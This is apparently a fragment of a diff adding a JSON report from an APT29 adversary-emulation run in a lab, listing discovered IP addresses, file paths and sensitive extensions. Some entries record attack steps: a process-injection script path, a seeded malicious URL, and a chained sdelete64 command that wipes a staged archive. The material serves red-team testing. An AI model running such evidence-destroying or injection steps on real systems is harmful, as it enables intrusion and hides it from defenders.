+      "267bad86-3f06-49f1-9a3e-6522f2a61e7a",
+      "afb8d8f7-d059-4825-95ae-c5727e2db320"
+    ],
+    "plugin": "",
+    "adversary_id": "de59889c-5b16-45f1-ac87-d2276d9d075a",
+    "description": "APT 29 - Without system reboot/RTLO Agent",
+    "objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc"
+  },
+  "jitter": "2/8",
+  "objectives": {
+    "id": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+    "name": "default",
+    "goals": [
+      {
+        "target": "exhaustion",
+        "count": 1048576,
+        "achieved": false,
+        "value": "complete",
+        "operator": "=="
+      }
+    ],
+    "percentage": 0,
+    "description": "This is a default objective that runs forever."
+  },
+  "facts": [
+    {
+      "created": "2022-03-22T11:26:05Z",
+      "collected_by": [],
+      "unique": "file.sensitive.extensionwav",
+      "origin_type": "SEEDED",
+      "score": 1,
+      "name": "file.sensitive.extension",
+      "value": "wav",
+      "links": [],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "",
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "trait": "file.sensitive.extension"
+    },
+    {
+      "created": "2022-03-22T11:26:05Z",
+      "collected_by": [],
+      "unique": "file.sensitive.extensionyml",
+      "origin_type": "SEEDED",
+      "score": 6,
+      "name": "file.sensitive.extension",
+      "value": "yml",
+      "links": [
+        "095a3357-f789-4e4f-8f20-4d3846773b9c"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "host.file.path(C:\\Users\\vagrant\\Desktop\\Ting\\Winlogbeat\\module\\powershell\\ingest\\powershell.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(C:\\Users\\vagrant\\Desktop\\Ting\\Winlogbeat\\module\\powershell\\ingest\\powershell_operational.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(C:\\Users\\vagrant\\Desktop\\Ting\\Winlogbeat\\module\\routing\\ingest\\routing.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(C:\\Users\\vagrant\\Desktop\\Ting\\Winlogbeat\\module\\security\\ingest\\security.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(C:\\Users\\vagrant\\Desktop\\Ting\\Winlogbeat\\module\\security\\dashboards.yml) : has_extension : file.sensitive.extension(yml)"
+      ],
+      "technique_id": "",
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "trait": "file.sensitive.extension"
+    },
+    {
+      "created": "2022-03-22T11:26:05Z",
+      "collected_by": [],
+      "unique": "file.sensitive.extensionpng",
+      "origin_type": "SEEDED",
+      "score": 3,
+      "name": "file.sensitive.extension",
+      "value": "png",
+      "links": [
+        "2322dce9-da28-4903-a9ea-0bcf8fc48f6c",
+        "df747467-4885-410e-856d-70cb4af738ea"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "host.file.path(C:\\Users\\vagrant\\Desktop\\screenshot.png) : has_extension : file.sensitive.extension(png)",
+        "host.file.path(C:\\Users\\vagrant\\staged\\screenshot.png) : has_extension : file.sensitive.extension(png)"
+      ],
+      "technique_id": "",
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "trait": "file.sensitive.extension"
+    },
+    {
+      "created": "2022-03-22T11:26:05Z",
+      "collected_by": [],
+      "unique": "server.malicious.urlkeyloggedsite.com",
+      "origin_type": "SEEDED",
+      "score": 1,
+      "name": "server.malicious.url",
+      "value": "keyloggedsite.com",
+      "links": [],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "",
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "trait": "server.malicious.url"
+    },
+    {
+      "created": "2022-09-29 19:33:01Z",
+      "collected_by": [
+        "qfpaqy",
+        "wpouwj"
+      ],
+      "unique": "host.ip.address192.168.56.107",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "192.168.56.107",
+      "links": [
+        "6cd2cbf6-cf80-4a52-91cb-ec3ccfc174a7",
+        "2ac9387d-36c2-4b18-a5f3-45b84a4c54a3",
+        "41ecafd7-c3c6-4f7d-a37e-3a6111300652",
+        "749bd318-6396-419a-a922-22e74175cc99",
+        "49e4fdbf-1a62-46e6-87b2-47d118b7fb36",
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4",
+        "c272df56-d2b3-4d2f-bbee-c6c13570e309"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1016",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:33:01Z",
+      "collected_by": [
+        "qfpaqy",
+        "wpouwj"
+      ],
+      "unique": "host.ip.address255.255.255.0",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "255.255.255.0",
+      "links": [
+        "6cd2cbf6-cf80-4a52-91cb-ec3ccfc174a7",
+        "749bd318-6396-419a-a922-22e74175cc99"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1016",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:33:01Z",
+      "collected_by": [
+        "qfpaqy",
+        "wpouwj"
+      ],
+      "unique": "host.ip.address192.168.56.102",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "192.168.56.102",
+      "links": [
+        "6cd2cbf6-cf80-4a52-91cb-ec3ccfc174a7",
+        "2ac9387d-36c2-4b18-a5f3-45b84a4c54a3",
+        "749bd318-6396-419a-a922-22e74175cc99",
+        "49e4fdbf-1a62-46e6-87b2-47d118b7fb36",
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1016",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:33:01Z",
+      "collected_by": [
+        "qfpaqy",
+        "wpouwj"
+      ],
+      "unique": "host.ip.address10.0.2.15",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "10.0.2.15",
+      "links": [
+        "6cd2cbf6-cf80-4a52-91cb-ec3ccfc174a7",
+        "2ac9387d-36c2-4b18-a5f3-45b84a4c54a3",
+        "41ecafd7-c3c6-4f7d-a37e-3a6111300652",
+        "749bd318-6396-419a-a922-22e74175cc99",
+        "49e4fdbf-1a62-46e6-87b2-47d118b7fb36",
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4",
+        "c272df56-d2b3-4d2f-bbee-c6c13570e309"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1016",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:33:01Z",
+      "collected_by": [
+        "qfpaqy",
+        "wpouwj"
+      ],
+      "unique": "host.ip.address10.0.2.2",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "10.0.2.2",
+      "links": [
+        "6cd2cbf6-cf80-4a52-91cb-ec3ccfc174a7",
+        "2ac9387d-36c2-4b18-a5f3-45b84a4c54a3",
+        "41ecafd7-c3c6-4f7d-a37e-3a6111300652",
+        "749bd318-6396-419a-a922-22e74175cc99",
+        "49e4fdbf-1a62-46e6-87b2-47d118b7fb36",
+        "c272df56-d2b3-4d2f-bbee-c6c13570e309"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1016",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:33:01Z",
+      "collected_by": [
+        "qfpaqy",
+        "wpouwj"
+      ],
+      "unique": "host.ip.address10.0.2.3",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "10.0.2.3",
+      "links": [
+        "6cd2cbf6-cf80-4a52-91cb-ec3ccfc174a7",
+        "2ac9387d-36c2-4b18-a5f3-45b84a4c54a3",
+        "749bd318-6396-419a-a922-22e74175cc99",
+        "49e4fdbf-1a62-46e6-87b2-47d118b7fb36"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1016",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:33:40Z",
+      "collected_by": [
+        "qfpaqy",
+        "wpouwj"
+      ],
+      "unique": "host.ip.address10.0.2.255",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "10.0.2.255",
+      "links": [
+        "2ac9387d-36c2-4b18-a5f3-45b84a4c54a3",
+        "49e4fdbf-1a62-46e6-87b2-47d118b7fb36"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1016",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:33:40Z",
+      "collected_by": [
+        "qfpaqy",
+        "wpouwj"
+      ],
+      "unique": "host.ip.address224.0.0.22",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "224.0.0.22",
+      "links": [
+        "2ac9387d-36c2-4b18-a5f3-45b84a4c54a3",
+        "49e4fdbf-1a62-46e6-87b2-47d118b7fb36"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1016",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:33:41Z",
+      "collected_by": [
+        "qfpaqy",
+        "wpouwj"
+      ],
+      "unique": "host.ip.address224.0.0.251",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "224.0.0.251",
+      "links": [
+        "2ac9387d-36c2-4b18-a5f3-45b84a4c54a3",
+        "49e4fdbf-1a62-46e6-87b2-47d118b7fb36"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1016",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:33:41Z",
+      "collected_by": [
+        "qfpaqy",
+        "wpouwj"
+      ],
+      "unique": "host.ip.address224.0.0.252",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "224.0.0.252",
+      "links": [
+        "2ac9387d-36c2-4b18-a5f3-45b84a4c54a3",
+        "49e4fdbf-1a62-46e6-87b2-47d118b7fb36"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1016",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:33:41Z",
+      "collected_by": [
+        "qfpaqy",
+        "wpouwj"
+      ],
+      "unique": "host.ip.address239.255.255.250",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "239.255.255.250",
+      "links": [
+        "2ac9387d-36c2-4b18-a5f3-45b84a4c54a3",
+        "49e4fdbf-1a62-46e6-87b2-47d118b7fb36"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1016",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:33:41Z",
+      "collected_by": [
+        "qfpaqy",
+        "wpouwj"
+      ],
+      "unique": "host.ip.address255.255.255.255",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "255.255.255.255",
+      "links": [
+        "2ac9387d-36c2-4b18-a5f3-45b84a4c54a3",
+        "49e4fdbf-1a62-46e6-87b2-47d118b7fb36"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1016",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:33:41Z",
+      "collected_by": [
+        "qfpaqy",
+        "wpouwj"
+      ],
+      "unique": "host.ip.address192.168.56.1",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "192.168.56.1",
+      "links": [
+        "2ac9387d-36c2-4b18-a5f3-45b84a4c54a3",
+        "49e4fdbf-1a62-46e6-87b2-47d118b7fb36"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1016",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:33:41Z",
+      "collected_by": [
+        "qfpaqy",
+        "wpouwj"
+      ],
+      "unique": "host.ip.address192.168.56.104",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "192.168.56.104",
+      "links": [
+        "2ac9387d-36c2-4b18-a5f3-45b84a4c54a3",
+        "49e4fdbf-1a62-46e6-87b2-47d118b7fb36",
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1016",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:33:41Z",
+      "collected_by": [
+        "qfpaqy",
+        "wpouwj"
+      ],
+      "unique": "host.ip.address192.168.56.255",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "192.168.56.255",
+      "links": [
+        "2ac9387d-36c2-4b18-a5f3-45b84a4c54a3",
+        "49e4fdbf-1a62-46e6-87b2-47d118b7fb36"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1016",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:35:57Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.file.pathC:\\Users\\vagrant\\ps.ps1",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "C:\\Users\\vagrant\\ps.ps1",
+      "links": [
+        "d4327eea-e657-44e9-8886-e8e9408809c8"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1057",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 19:36:37Z",
+      "collected_by": [
+        "qfpaqy",
+        "wpouwj"
+      ],
+      "unique": "host.file.pathC:\\Users\\Public\\sandcat.go",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "C:\\Users\\Public\\sandcat.go",
+      "links": [
+        "919fa2b8-51cd-47fe-97b9-a1708ff64bb5",
+        "805be9c7-1484-4ba0-94b1-372db273f605"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1057",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 19:36:37Z",
+      "collected_by": [
+        "qfpaqy",
+        "wpouwj"
+      ],
+      "unique": "host.file.pathC:\\GHOSTS\\ghosts.exe",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "C:\\GHOSTS\\ghosts.exe",
+      "links": [
+        "919fa2b8-51cd-47fe-97b9-a1708ff64bb5",
+        "805be9c7-1484-4ba0-94b1-372db273f605"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1057",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 19:39:15Z",
+      "collected_by": [
+        "qfpaqy",
+        "wpouwj"
+      ],
+      "unique": "host.file.pathC:\\pagefile.sys",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "C:\\pagefile.sys",
+      "links": [
+        "41ecafd7-c3c6-4f7d-a37e-3a6111300652",
+        "c272df56-d2b3-4d2f-bbee-c6c13570e309"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1082",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 19:47:49Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.file.pathC:\\Users\\vagrant\\Invoke-PSInject.ps1",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "C:\\Users\\vagrant\\Invoke-PSInject.ps1",
+      "links": [
+        "a83b263e-46d8-4917-ab13-02f2f29a6a41"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1055",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 19:51:37Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.file.path/accepteula \"$env:APPDATA\\Draft.Zip\";.\\sdelete64.exe",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "/accepteula \"$env:APPDATA\\Draft.Zip\";.\\sdelete64.exe",
+      "links": [
+        "af174dca-5499-4860-b514-24f919bd71b3"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1070.004",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 19:53:11Z",
+      "collected_by": [
+        "wpouwj"
+      ],
+      "unique": "host.file.pathC:\\Windows\\system32\\ps.ps1",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.file.path",
+      "value": "C:\\Windows\\system32\\ps.ps1",
+      "links": [
+        "2fcebf59-47e9-4d00-a238-27f250eff253"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1057",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.file.path"
+    },
+    {
+      "created": "2022-09-29 19:53:42Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address20.90.152.133",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "20.90.152.133",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:42Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address64.233.165.157",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "64.233.165.157",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:42Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address54.230.111.53",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "54.230.111.53",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:42Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address142.250.74.164",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "142.250.74.164",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address142.250.74.174",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "142.250.74.174",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [
+        "[]"
+      ],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address142.250.74.35",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "142.250.74.35",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address54.230.111.33",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "54.230.111.33",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address216.58.207.226",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "216.58.207.226",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address35.186.195.222",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "35.186.195.222",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address34.95.69.49",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "34.95.69.49",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address35.190.72.161",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "35.190.72.161",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address35.190.36.172",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "35.190.36.172",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address151.101.238.132",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "151.101.238.132",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address104.16.123.175",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "104.16.123.175",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address143.204.55.80",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "143.204.55.80",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address23.33.119.19",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "23.33.119.19",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address104.88.85.173",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "104.88.85.173",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address74.119.96.27",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "74.119.96.27",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address54.68.34.170",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "54.68.34.170",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address54.230.245.39",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "54.230.245.39",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address143.204.55.16",
+      "origin_type": "LEARNED",
+      "score": 1,
+      "name": "host.ip.address",
+      "value": "143.204.55.16",
+      "links": [
+        "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4"
+      ],
+      "limit_count": -1,
+      "relationships": [],
+      "technique_id": "T1049",
+      "source": "bfd4ce14-e71b-4814-be25-89e07c180c24",
+      "trait": "host.ip.address"
+    },
+    {
+      "created": "2022-09-29 19:53:43Z",
+      "collected_by": [
+        "qfpaqy"
+      ],
+      "unique": "host.ip.address143.204.55.14",
+      "origin_type": "LEARNED",
+      "score": 1,
